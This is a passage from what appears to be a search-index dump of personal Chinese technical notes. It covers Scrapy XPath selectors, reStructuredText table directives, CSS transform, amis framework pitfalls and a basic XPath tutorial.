<strong>Next Page</strong></a>'] XPath表达式变量 XPath 允许你在表达式中引用变量, 语法: $varName 与SQL类似, 还支持使用 ? 占位符, 来做变量替换: >>> # `$val` used in the expression, a `val` argument needs to be passed >>> response.xpath(\"//div[@id=$val]/a/text()\", val=\"images\").get() 'Name: My image 1 ' 又比如寻找 div 下包含 5 个孩子节点: >>> response.xpath(\"//div[count(a)=$cnt]/@id\", cnt=5).get() 'images' 任何变量必须使用的时候就给定值, 否则会报错 ValueError: XPath error: exception 移除命名空间 有些爬虫项目获取到的 HTML/XML 是存在命名空间的, 但是我们并不关注这个, 只想处理元素, 所以可以直接移除: Selector.remove_namespaces() 比如以下的XML: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml-stylesheet ... <feed xmlns=\"http://www.w3.org/2005/Atom\" xmlns:openSearch=\"http://a9.com/-/spec/opensearchrss/1.0/\" xmlns:blogger=\"http://schemas.google.com/blogger/2008\" xmlns:georss=\"http://www.georss.org/georss\" xmlns:gd=\"http://schemas.google.com/g/2005\" xmlns:thr=\"http://purl.org/syndication/thread/1.0\" xmlns:feedburner=\"http://rssnamespace.org/feedburner/ext/1.0\"> ... 有一个默认的 http://www.w3.org/2005/Atom 和其他的 比如 gd:\" prefix for \"http://schemas.google.com/g/2005\" 当尝试选择 link 时, 获取不到结果: >>> response.xpath(\"//link\") [] 因为其存在于默认的命名空间内. 移除掉即可: >>> response.selector.remove_namespaces() >>> response.xpath(\"//link\") [<Selector query='//link' data='<link rel=\"alternate\" type=\"text/html\" h'>, <Selector query='//link' data='<link rel=\"next\" type=\"application/atom+'>, ... 为什么默认不直接移除? 移除对整个文档所有节点操作, 代价大 并非所有情况下都不会用到 namespace 使用 EXSLT 拓展 Scrapy选择器构建在lxml之上，支持一些EXCIBLE扩展， 并带有这些预注册的命名空间，可用于EXCIBLE表达式： prefix namespace usage re http://exslt.org/regular-expressions 正则表达式 set http://exslt.org/sets 集合操作 (set manipulation) 正则表达式支持 默认 XPath 有提供字符串的 starts-with() 和 contains() 方法, 但是更复杂的匹配就不行了, 这时可以用 test() 方法 比如选择指定 class 的 li 标签下的 链接: >>> from scrapy import Selector >>> doc = \"\"\" ... <div> ... <ul> ... <li class=\"item-0\"><a href=\"link1.html\">first item</a></li> ... <li class=\"item-1\"><a href=\"link2.html\">second item</a></li> ... <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li> ... <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li> ... <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li> ... </ul> ... </div> ... \"\"\" >>> sel = Selector(text=doc, type=\"html\") >>> sel.xpath(\"//li//@href\").getall() ['link1.html', 'link2.html', 'link3.html', 'link4.html', 'link5.html'] >>> sel.xpath('//li[re:test(@class, \"item-\\d$\")]//@href').getall() ['link1.html', 'link2.html', 'link4.html', 'link5.html'] 警告 C库的 libxslt 并不提供 EXSLT 的支持, 所以实际上匹配使用的是 Python 的 /docs/后端/python/python标准库/re . 故, 存在性能问题是无法避免的 集合操作 有时候可能不想要文档的某个部分 比如 https://schema.org/Product 的以下内容, 存在 itemscopes 和 corresponding itemprops: >>> doc = \"\"\" ... <div itemscope itemtype=\"http://schema.org/Product\"> ... <span itemprop=\"name\">Kenmore White 17\" Microwave</span> ... <img src=\"kenmore-microwave-17in.jpg\" alt='Kenmore 17\" Microwave' /> ... <div itemprop=\"aggregateRating\" ... itemscope itemtype=\"http://schema.org/AggregateRating\"> ... Rated <span itemprop=\"ratingValue\">3.5</span>/5 ... based on <span itemprop=\"reviewCount\">11</span> customer reviews ... </div> ... <div itemprop=\"offers\" itemscope itemtype=\"http://schema.org/Offer\"> ... <span itemprop=\"price\">$55.00</span> ... <link itemprop=\"availability\" href=\"http://schema.org/InStock\" />In stock ... </div> ... Product description: ... <span itemprop=\"description\">0.7 cubic feet countertop microwave. ... Has six preset cooking categories and convenience features like ... Add-A-Minute and Child Lock.</span> ... Customer reviews: ... <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\"> ... <span itemprop=\"name\">Not a happy camper</span> - ... by <span itemprop=\"author\">Ellie</span>, ... <meta itemprop=\"datePublished\" content=\"2011-04-01\">April 1, 2011 ... <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\"> ... <meta itemprop=\"worstRating\" content = \"1\"> ... <span itemprop=\"ratingValue\">1</span>/ ... <span itemprop=\"bestRating\">5</span>stars ... </div> ... <span itemprop=\"description\">The lamp burned out and now I have to replace ... it. </span> ... </div> ... <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\"> ... <span itemprop=\"name\">Value purchase</span> - ... by <span itemprop=\"author\">Lucas</span>, ... <meta itemprop=\"datePublished\" content=\"2011-03-25\">March 25, 2011 ... <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\"> ... <meta itemprop=\"worstRating\" content = \"1\"/> ... <span itemprop=\"ratingValue\">4</span>/ ... <span itemprop=\"bestRating\">5</span>stars ... </div> ... <span itemprop=\"description\">Great microwave for the price. It is small and ... fits in my apartment.</span> ... </div> ... ... ... </div> ... \"\"\" >>> sel = Selector(text=doc, type=\"html\") >>> for scope in sel.xpath(\"//div[@itemscope]\"): ... print(\"current scope:\", scope.xpath(\"@itemtype\").getall()) ... props = scope.xpath( ... \"\"\" ... set:difference(./descendant::*/@itemprop, ... .//*[@itemscope]/*/@itemprop)\"\"\" ... ) ... print(f\" properties: {props.getall()}\") ... print(\"\") ... current scope: ['http://schema.org/Product'] properties: ['name', 'aggregateRating', 'offers', 'description', 'review', 'review'] current scope: ['http://schema.org/AggregateRating'] properties: ['ratingValue', 'reviewCount'] current scope: ['http://schema.org/Offer'] properties: ['price', 'availability'] current scope: ['http://schema.org/Review'] properties: ['name', 'author', 'datePublished', 'reviewRating', 'description'] current scope: ['http://schema.org/Rating'] properties: ['worstRating', 'ratingValue', 'bestRating'] current scope: ['http://schema.org/Review'] properties: ['name', 'author', 'datePublished', 'reviewRating', 'description'] current scope: ['http://schema.org/Rating'] properties: ['worstRating', 'ratingValue', 'bestRating'] 主要是: set:difference(./descendant::*/@itemprop, .//*[@itemscope]/*/@itemprop) set:difference 表示使用一个集合减去另一个集合, 也就是: ./descendant::*/@itemprop 减去: .//*[@itemscope]/*/@itemprop 来分别看分析这两个的含义: ./descendant::*/@itemprop descendant 翻译过来就是后代, 这里就是表示当前元素的所有后代元素(后代, 孙代...), 总来说就是, 所有后代元素的 itemprop 属性 .//*[@itemscope]/*/@itemprop 选择所有包含 itemscope 属性的 itemprop 属性 整个表达式的含义是选择当前节点的所有后代节点中具有 itemprop 属性的属性节点， 然后从中排除当前节点下具有 itemscope 属性的元素节点的子节点中的 itemprop 属性节点， 最后返回剩余的元素节点集合 其他 XPath 拓展 Scrapy 选择器 还提供了 has-class , 可用于判断是否包含 class 属性, 对于HTML: >>> from scrapy.http import HtmlResponse >>> response = HtmlResponse( ... url=\"http://example.com\", ... body=\"\"\" ... <html> ... <body> ... <p class=\"foo bar-baz\">First</p> ... <p class=\"foo\">Second</p> ... <p class=\"bar\">Third</p> ... <p>Fourth</p> ... </body> ... </html> ... \"\"\", ... encoding=\"utf-8\", ... ) 这样用: >>> response.xpath('//p[has-class(\"foo\")]') [<Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo bar-baz\">First</p>'>, <Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo\">Second</p>'>] >>> response.xpath('//p[has-class(\"foo\", \"bar-baz\")]') [<Selector query='//p[has-class(\"foo\", \"bar-baz\")]' data='<p class=\"foo bar-baz\">First</p>'>] >>> response.xpath('//p[has-class(\"foo\", \"bar\")]') [] 其中: //p[has-class(\"foo\", \"bar-baz\")] 相当于 CSS的: p.foo.bar-baz 注解 has-class 其实性能是比较慢的, 因为它是一个纯 Python 函数. 故建议仅适用于, CSS选择器不容易描述的情况下 添加自定义 Python 方法 API: parsel.xpathfuncs.set_xpathfunc(fname: str, func: Optional[Callable]) -> None[source] 用于注册自定义 XPath 表达式方法 Register a custom extension function to use in XPath expressions. fname 方法名 func 具体的执行方法, 为None回注册失败","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html"},{"title":"tables","text":"参考: https://docutils.sourceforge.io/docs/ref/rst/directives.html#tables table 表格 支持命令选项: align: \"left\", \"center\", or \"right\" 水平对齐方式 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 widths: \"auto\", \"grid\", or a list of integers 明确设置列宽度。如果与宽度选项一起使用，则指定相对宽度。覆盖table_style设置或类值\"colwidths-auto\"。默认值取决于table_style配置设置。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。默认Html5 \"grid\"根据输入列的宽度（以字符为单位）确定列宽度。这个没怎么懂. 源码: .. table:: Truth table for \"not\" :width: 30% ===== ===== A not A ===== ===== False True True False ===== ===== 效果 Truth table for \"not\" A not A False True True False csv-table 以csv（逗号分隔值）数据的形式写表格. 支持单元格内的块标记和内联标记。线端在单元格中被识别。 不支持检查每行中的列数是否相同。该指令会自动在短行末尾添加空条目。 支持命令选项: align: \"left\", \"center\", or \"right\" 水平布局方式 delim: char , \"tab\" , \"space\" 表格列分隔符, 默认逗号, 可自定义为冒号等 encoding: string 若使用url或者csv文件的数据, 用什么编码解析, 默认使用文件输出编码 escape: char 将使用的分隔符转义为普通符号, 默认是双引号 如: 一列(这里双双引号最终是一对双引号) \"He said, \"\"Hi!\"\"\" 两列(双引号不会被输出) -M, \"move/rename a branch, even if target exists\" file: string (newlines removed) 引用本地csv文件的路径 header: CSV data 表格头定义, 需要在 header-rows 之前 header-rows: integer 除了header定义的表头, 数据主体还有几行是表头, 默认0. keepspace: flag (empty) 将分隔符后面的空格视为显著的(将空格输出)。默认情况下是忽略此类空格。 quote: char 一个字符字符串，用于引用包含分隔符或以引号字符开头的元素。默认为\"（引用）。可以指定为Unicode代码点；有关语法详细信息，请参阅unicode指令。 stub-columns: integer 用作存根的表列数量（左侧的行标题）。默认为0。 url: string (whitespace removed) 一个CSV数据表格的链接. widths: integer [integer...] or \"auto\" 相对列宽度列表。默认值为等宽度列（100%/#columns）。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 警告 \"Csv-table\"指令的\":file:\"和\":url:\"选项代表了潜在的安全漏洞。它们可以通过\"file_insertion_enabled\"运行时设置禁用。 源码: .. csv-table:: Frozen Delights! :header: \"Treat\", \"Quantity\", \"Description\" \"Treat2\", \"Quantity2\", \"Description2\" :widths: 15, 10, 30 :header-rows: 1 \"Albatross\", 2.99, \"On a stick!\" \"Crunchy Frog\", 1.49, \"If we took the bones out, it wouldn't be crunchy, now would it?\" \"Gannet Ripple\", 1.99, \"On a stick!\" 效果 Frozen Delights! Treat Quantity Description Treat2 Quantity2 Description2 Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be crunchy, now would it? Gannet Ripple 1.99 On a stick! list-table 以列表的形式创建表格, 注意保持元素列一致 支持的命令选项: align: \"left\", \"center\", or \"right\" 水平对其方式 header-rows: integer 表头行数 stub-columns: integer 用作存根的表列数量（左侧的行标题）。默认为0。 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 widths: integer [integer...] or \"auto\" 相对列宽度列表。默认值为等宽度列（100%/#columns）。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。 源码: .. list-table:: Frozen Delights! :widths: 15 10 30 :header-rows: 1 :stub-columns: 1 * - Treat - Quantity - Description * - Albatross - 2.99 - On a stick! * - Crunchy Frog - 1.49 - If we took the bones out, it wouldn't be crunchy, now would it? * - Gannet Ripple - 1.99 - On a stick! 效果 Frozen Delights! Treat Quantity Description Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be crunchy, now would it? Gannet Ripple 1.99 On a stick!","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-tables.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-tables.html"},{"title":"表格","text":"支持的指令 table csv-table list-table 符号表格 table 简单表格, 例: .. table:: 一个测试表格 :name: csv表格 ====== ======== ======== head 1 2 ====== ======== ======== 1 2 3 2 3 4 3 4 5 ====== ======== ======== 注解 简单表格可以不需要 ..table , 直接使用符号画出来可以自动识别 csv-table csv数据表格, 支持自定义分隔符, 例: .. csv-table:: 一个测试表格 :name: 不知道有啥用 :header: head, 1, 2 1, 2, 3 2, 3, 4 3, 4, 5 list-table 列表格式表格: .. list-table:: 一个测试表格 :name: test_list表格 :header-rows: 1 * - head - 1 - 2 * - 1 - 2 - 3 * - 2 - 3 - 4 * - 3 - 4 - 5 符号表格 我这样称, 没注意官方怎么定义. 源码: +-------+-------+-------+ | head1 | head2 | head3 | +=======+=======+=======+ | 1 | 2 | 3 | +-------+-------+-------+ | 4 | 5 | 6 | +-------+-------+-------+ | 7 | 8 | 9 | +-------+-------+-------+ 效果基本都是一样的: head1 head2 head3 1 2 3 2 3 4 3 4 5 注解 这种符号表格, 只能用空格而不是tab, 否则会导致识别不正常(截止于Sphinx5.3, 后续没试过) 另外符号表格画起来好麻烦 表格折行打印 有时候文字太长, 需要折行视为同一行 简单表格只能实现第二列后的折行 合并也支持 效果: hd 1 2 1 2 889 5 456 2 3 6 3 4 7 源码 也支持表格合并 合并表格体第二行: hd 1 2 1 2 889 5 456 2 3 6 3 4 7 源码: 此处参考: 表格学习 符号表格可以实现所有列的折行 head1 head2 head3 1 4 2 24 3 34 2 3 4 3 4 5","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-sheet.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-sheet.html"},{"title":"transform","text":"允许你旋转，缩放，倾斜或平移给定元素(包括2D/3D)。这是通过修改 CSS 视觉格式化模型的坐标空间来实现的。 示例: https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform 说明: https://www.w3school.com.cn/cssref/pr_transform.asp 常见的 transform 属性值及其作用 平移（Translate） translate() 函数用于在水平和垂直方向上平移元素: transform: translate(100px, 50px); 上述代码将把元素向右平移 100 像素，向下平移 50 像素。 旋转（Rotate） rotate() 函数用于按指定角度旋转元素: transform: rotate(45deg); 上述代码将元素顺时针旋转 45 度。 缩放（Scale） scale() 函数用于按指定比例缩放元素: transform: scale(1.5); 上述代码将元素的尺寸放大到原始尺寸的 1.5 倍。 支持不同方向的缩放, 比如仅缩放高度: transform: scaleY(1.5); 倾斜（Skew） skew() 函数用于按指定角度倾斜元素: transform: skew(30deg, -10deg); 上述代码将元素水平方向倾斜 30 度，垂直方向倾斜 -10 度。 其他 矩阵变换（matrix()）、透视效果（perspective()）","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html"},{"title":"调用其他组件","text":"比如调用Form的submit, 在action中定义: { \"type\": \"action\", \"label\": \"提交表单\", \"level\": \"primary\", \"className\": \"mr-3 mb-3\", \"onEvent\": { \"click\": { \"actions\": [ { \"actionType\": \"submit\", \"componentId\": \"form-action-receiver\" } ] } } }, 其中, \"componentId\": \"form-action-receiver\" 表示需要在form中定义id: id: \"form-action-receiver\" form支持的行为: https://aisuda.bce.baidu.com/amis/zh-CN/components/form /index#动作表 注解 如果要同时定义多个action, 可以使用actions串行列表. 如dialog的onEvent: type: \"dialog\", ... onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { envD: '${ENCODEJSON(envDD)}', envDD: '${envDD}', eName: 'x${eName}' } } }, { actionType: 'setValue', componentId: \"dis-data\", args: { value: { envD: '${ENCODEJSON(envDD)}', envDD: 'x${envDD}', eName: 'x${eName}' } } }, { actionType: 'custom', script: (context: any, doAction: any, event: any) => { console.log(context) } } ] } } 最后的 custom 属于 自定义JS 见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#自定义-js","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Call-other-components.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Call-other-components.html"},{"title":"调用本地自定义函数","text":"这个是个坑, 官网文档只提了一句 Button , 且不支持完全自定义参数, 其他控件比如 Dialog 的完全不知道怎么用 比如 button 的点击事件, onClick 直接给函数引用: { \"type\": \"page\", \"body\": [ { \"type\": \"button\", \"label\": \"调用本地函数\", \"onClick\": this._handleUpdate, } ] } 又比如 dialog 的 onConfirm dialog: { onConfirm: this._handleUpdate, type: 'dialog', data: { envData: { 5: 9, } }, body: [ { \"type\": \"input-kv\", \"name\": \"envData\", } ] } Button 的参数列表为 (event, props) , 可以通过 props.data 访问到数据域的内容.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Call-the-local-custom-function.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Call-the-local-custom-function.html"},{"title":"combo无法指定更新某一个","text":"第一次遇到是使用 input-array , 数组的每一个项有多个指定的值, 指定项id并使用 componentId , 会造成只能更新第一个项的数据, 即使是由其他项触发. 这个时候可以使用 componentName 指定当前项的name, 会自动处理 实测使用官网提的 this.index 无效: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/combo#设置序号","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html"},{"title":"与React结合使用的数据更新","text":"这个算是一个小坑, React 的数据域, 向来都是通过 state 来控制渲染. 原以为 amis 已经内置处理了这个问题, 结果没有, 还是得 state 出马: import {render as renderAmis} from 'amis'; export class MyComponent extends React.Component<any, any> { state = { _envData: { 1: 5, 2: 6, } } render(){ return ( <div> {renderAmis( { type: 'page', title: '简单页面', data: { envData: this.state._envData, }, body: [...] } )} </div> ) } }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Data-update-used-with-React.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Data-update-used-with-React.html"},{"title":"dialog更新父组件数据域","text":"一般来说有两种方案 方案一: 如果使用的是API, 在dialog上增加一个数据更新的API即可, 外部也需要有查询的API 方案二: 使用dialog提供的 setValue , 可以指定更新某位置的数据域, 需要提前使用id指定位置: { type: \"service\", data: { envData: this.state._envData, eName: 'tt' }, body: [ { type: 'grid', columns: [ { type: 'form', id: 'top-form', body: [ { type: 'input-text', name: 'eName', label: 'label0', mode: \"horizontal\", }, { type: 'flex', style: { width: '100%', height: '100%', justifyContext: 'flex-end', flexDirection: 'column' }, items: [ { icon: 'fas fa-list-ul', type: 'button', actionType: 'dialog', dialog: { type: 'dialog', body: [ { type: \"input-kv\", name: \"envData\", }, { type: 'input-text', label: \"name${eName}\", name: 'eName', } ], onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { eName: 'x${eName}' } } } ] } } } }, ] }, ] }, ] }, ] }, 主要的, 定义id: id: 'top-form', 定义执行更新时候的数据: onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { eName: 'x${eName}' } } } ] } } 注意, 貌似只能更新某一条数据链上的内容 默认setValue会将新数据与目标组件数据进行合并; 可以通过\"dataMergeMode\": \"override\"来覆盖目标组件数据; 除非是当前数据链上的数据, 否则需要指定额外的id去更新指定控件的数据","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html"},{"title":"类disabled属性只能识别数据链对象","text":"比如有一个 checkbox 控件 name 为: com.app.enable { \"type\": \"checkbox\", \"name\": \"com.app.enable\" } 同时有一个相关的 input-text 控件的 disabledOn 属性与其相关联: { \"type\": \"input-text\", \"name\": \"com.app.version\" \"disabledOn\": \"${!com.app.enable}\" } 表示只有 checkbox 选择的时候 text 才可用 但是因为属性是包含 . 的, 所以内部默认会识别为(数据块1): { com: { app: { version: \"\", enable: \"\", } } } 其中, 组件的 name 可以自动识别直接给的链式数据(数据块2): {\"com.app.enable\": false} 而组件的 disabledOn 只能识别解析后的数据, 也就是只能识别 (数据块1), 效果就是, 当 disabledOn 包含点时候, 第一次使用没问题, 但是当数据域已有 (数据块2) 形式数据时, disabledOn 属性将失效 得将点替换为其它才能保证正常使用. 注解 这个问题触发的调教貌似比较苛刻, 目前只在使用 apiInit 的时候遇到过 还有一点, 好像是模版语法还是啥, 支持使用this, 比如有数据域: data: { isOne: true } disabledOn支持直接设置为: disabledOn: \"!this.isOne\" 但是 数据域里不能这样用 , 比如: type: \"select\", source: { url: \"xxx/xxx/xxx?a=${a}\", data: { a: \"this.a\" } }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html"},{"title":"disabledOn 表达式如果包含有 横杠 - 时会无效","text":"提出于 https://github.com/baidu/amis/issues/9673 原来是 - 会被当作 减号 , 需要转义处理: { \"type\": \"checkbox\", \"name\": \"_enableEnvAll-bob\", \"label\": \"启用\", // \"mode\": \"horizontal\", style: { justifyContent: 'center' }, }, { type: \"input-text\", name: \"_enableEnvAll-bob\", disabledOn: \"${!_enableEnvAll\\\\-bob}\", },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html"},{"title":"input-kv说明","text":"与 /docs/前端/框架/amis/问题/input-text说明 不一样, input-kv只能接受 JSON 数据","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-KV-description.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-KV-description.html"},{"title":"input-array使用","text":"必须有 item , 组件才知道怎么渲染: { type: 'input-array', items: { type: 'input-text' } } 如果是多个项作为一个组, 那么需要使用 combo : { type: 'input-array', items: { type: 'combo', controls: [ { type: 'input-text', name: 'va', label: 'va', }, { type: 'input-text', name: 'vb', label: 'vb', } ] } } 这时数据的定义: eaa: [ {va: 1, vb: 11}, ] 注解 如果在 input-array 内部定义了子组件, 那么在这里面得 componentId , componentName 可能只能调用到内部的组件, 如果是外部组件多半就是找不到组件 列表长度交互 当列表数据大于等于1时, 禁止新增: { type: 'input-array', name: 'array1', label: '长度: ${COUNT(array1)}', addableOn: '${COUNT(array1) < 1}', items: {...} } 注解 不知道为什么, 官网文档没有提到可以用 addableOn, 只写了 addable","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Rray-use.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Rray-use.html"},{"title":"input-text说明","text":"input-text接受的数据, 如果是JSON格式, 会自动转换为字符串展示, 同时在此处所有的更改, 也会自动变换原来的JSON格式(前提是格式正确) 注解 但是, 估计也是text原因, 使用API提交的时候还是会是字符串形式, 坑","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Text-description.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Text-description.html"},{"title":"渲染界面无样式","text":"注意需要导入内置的CSS才有样式: import 'amis/lib/themes/cxd.css'; import 'amis/lib/helper.css'; import 'amis/sdk/iconfont.css'; // 或 import 'amis/lib/themes/antd.css'; 如果是html, 这样引入: <link href=\"./node_modules/amis/lib/themes/cxd.css\" /> <link href=\"./node_modules/amis/lib/helper.css\" /> <link href=\"./node_modules/amis/sdk/iconfont.css\" /> <!-- 或 <link href=\"./node_modules/amis/lib/themes/antd.css\" /> -->","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html"},{"title":"React使用","text":"除了用json, 在 React 环境下使用 amis，还可以直接引入 amis 内置组件， 在 amis 项目源码 src/components 下的组件都是标准 React 组件， 可以在项目中直接引用，这样就能将 amis 当成纯粹 UI 库来使用: import {Button} from 'amis-ui'; ... <Button onClick={() => {}} type=\"button\" level=\"link\" className=\"navbar-btn\" > 按钮 </Button>","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-React.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-React.html"},{"title":"设置其他组件的值","text":"最简单的, 直接使用 value 即可: { type: \"input-text\", name: \"input_v2\", }, { type: \"input-text\", name: \"input_v\", value: \"${input_v2}\" }, input_v2更新会自动更新input_v 或者用onChange只能这样写: { type: \"input-text\", name: \"input_v2\", onEvent: { change: { actions: [ { actionType: \"setValue\", componentName: \"input_v\", args: { value: \"${input_v2}\" } }, ] } } },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html"},{"title":"数据域的向上更新","text":"重点! 适用于当前数据链 主要对前面的不当做一个纠正, 这部分纠正有空再找出来改, 同一个页面的数据域, 向上向下的更新都是支持的, .. 不过复杂情况下, 默认仅能保持两层, 可以使用 trackExpression 来确定跟踪的字段; 不同页面的, 比如弹出一个dialog, 相当于是一个新的页面, data 应当是被拷贝了一份, dialog数据的变化无法影响到上一层 dialog父级组件的数据可以向下传递 , 但是dialog父级组件的兄弟组件不行.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html"},{"title":"validations验证信息配置无效","text":"有时候表单信息需要配置字段验证 只有在Form表单中才能验证字段 , 因为只有它才有提交功能, 验证一般只有提交或者活触发自动提交的时候才会触发; 成功触发一次后, 看效果后续都是此字段自动立刻校验了 例: { type: 'form', body: { type: 'input-text', name: 'eName', label: 'label0', mode: \"horizontal\", validations: { \"isNumeric\": true, \"minimum\": 10, // 表示数字最小为10 }, // description: \"请输入数字类型文本\", validationErrors: { \"isNumeric\": '不是数字', \"minimum\": \"同学，最少输入$1以上的数字哈\" } }, xs: 11 },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html"},{"title":"变量使用","text":"若变量名不存在特殊字符时, 可以直接使用: $varName 若存在特殊字符或者下划线或者表达式等, 需要括起来才能正常识别位数据域数据: ${varName} 所以一般建议统一加上花括号 另外对于表达式而言, 不加花括号是旧版直接用js, 可参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression github也有相关问题 https://github.com/baidu/amis/issues/9629","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-Variable-use.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Variable-use.html"},{"title":"componentName无效","text":"继续上一节 /docs/前端/框架/amis/问题/combo无法指定更新某一个 , 若当前项的 name 包含 . , 那么可能会把它做错数据来解析(链式调用), 导致 componentName 无法正确指向想要的属性. 所以, 控件 name 命名尽量不要使用 .","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-componentname-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-componentname-invalid.html"},{"title":"实例","text":"我们将在下面的例子中使用这个 XML 文档： \"books.xml\": <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book category=\"COOKING\"> <title lang=\"en\">Everyday Italian</title> <author>Giada De Laurentiis</author> <year>2005</year> <price>30.00</price> </book> <book category=\"CHILDREN\"> <title lang=\"en\">Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> <book category=\"WEB\"> <title lang=\"en\">XQuery Kick Start</title> <author>James McGovern</author> <author>Per Bothner</author> <author>Kurt Cagle</author> <author>James Linn</author> <author>Vaidyanathan Nagarajan</author> <year>2003</year> <price>49.99</price> </book> <book category=\"WEB\"> <title lang=\"en\">Learning XML</title> <author>Erik T. Ray</author> <year>2003</year> <price>39.95</price> </book> </bookstore> 加载 XML 文档 所有现代浏览器都支持使用 XMLHttpRequest 来加载 XML 文档的方法。 针对大多数现代浏览器的代码: var xmlhttp=new XMLHttpRequest() 针对古老的微软浏览器（IE 5 和 6）的代码: var xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\") 选取节点 不幸的是，Internet Explorer 和其他处理 XPath 的方式不同。 在我们的例子中，包含适用于大多数主流浏览器的代码。 Internet Explorer 使用 selectNodes() 方法从 XML 文档中的选取节点: xmlDoc.selectNodes(xpath); Firefox、Chrome、Opera 以及 Safari 使用 evaluate() 方法从 XML 文档中选取节点: xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE,null); 选取所有 title 下面的例子选取所有 title 节点: /bookstore/book/title 选取第一个 book 的 title 下面的例子选取 bookstore 元素下面的第一个 book 节点的 title: /bookstore/book[1]/title 这里有一个问题。上面的例子在 IE 和其他浏览器中输出不同的结果。 IE5 以及更高版本将 [0] 视为第一个节点，而根据 W3C 的标准，应该是 [1]。 一种解决方法！ 为了解决 IE5+ 中 [0] 和 [1] 的问题，可以为 XPath 设置语言选择（SelectionLanguage）。 下面的例子选取 bookstore 元素下面的第一个 book 节点的 title: xml.setProperty(\"SelectionLanguage\",\"XPath\"); 